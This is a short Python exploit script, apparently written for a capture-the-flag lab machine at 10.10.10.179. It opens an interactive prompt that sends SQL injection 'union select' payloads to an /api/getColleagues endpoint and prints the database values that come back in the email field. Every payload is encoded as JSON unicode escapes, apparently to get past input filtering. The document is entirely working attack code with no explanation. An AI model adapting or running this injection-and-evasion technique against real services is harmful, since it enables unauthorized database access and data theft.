import requests, json,cmd
url = 'http://10.10.10.179/api/getColleagues'
input = "a' union select 1,2,3,'HELLO',5-- -"
header = {"Content-Type":"application/json;charset=utf-8"}

def gen_payload(input):
    payload = ""
    for i in input:
        payload+=r"\u{:04x}".format(ord(i))
    return payload

class exploit(cmd.Cmd):
    prompt = "> "

    def default(self,line):
        payload = gen_payload(line)
        data = '{"name":"'+payload+'"}'
        r = requests.post(url,data=data,headers = header)
        print(r.text)
    
    def do_union(self,line):
        payload = "a' union select 1,2,3,"+line+",5-- -"
        data = '{"name":"'+gen_payload(payload)+'"}'
        r = requests.post(url,data=data,headers = header)
        try:
            rq = json.loads(r.text)
            print(rq[0]['email'])
        except:
            print(r.text)

exploit().cmdloop()